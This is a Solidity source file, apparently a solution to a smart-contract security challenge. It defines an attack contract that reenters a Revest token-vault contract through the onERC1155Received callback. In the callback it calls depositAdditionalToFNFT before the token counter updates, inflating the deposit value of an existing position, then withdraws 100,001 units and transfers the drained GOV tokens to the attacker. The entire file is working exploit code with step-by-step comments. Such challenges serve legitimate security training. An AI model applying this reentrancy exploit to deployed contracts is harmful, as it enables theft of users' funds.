// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

import {Token} from "src/other/Token.sol";
import {Revest} from "src/degen-jackpot/Revest.sol";

contract DegenJackpotAttack {
    address public attacker;
    Token public gov;
    Revest public revest;
    bool public callback;

    constructor(Token _gov, Revest _revest) {
        attacker = msg.sender;
        gov = _gov;
        revest = _revest;
    }

    function setCallbackTrue() external {
        callback = true;
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        returns (bytes4)
    {
        if (callback) {
            callback = false; // depositAdditionalToFNFT calls _mint again and we do not want to reenter then, so make this false

            // approve gov for sending
            gov.approve({spender: address(revest), amount: type(uint256).max});

            // because `fnftsCreated` has not yet been updated, and fnftId=1 will be burned and fnftId=2 minted
            // we update the `depositAmount` of fnftId=2 to 1e18, which already has quantity of 100_001
            revest.depositAdditionalToFNFT({fnftId: 1, amount: 1e18, quantity: 1});
            // withdraw 100_001 from fnftId=2
            revest.withdrawFNFT({fnftId: 2, quantity: 100_001});
        }

        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

    // to send GOV tokens to attacker
    function getGov() external {
        gov.transfer({to: attacker, amount: gov.balanceOf(address(this))});
    }
}
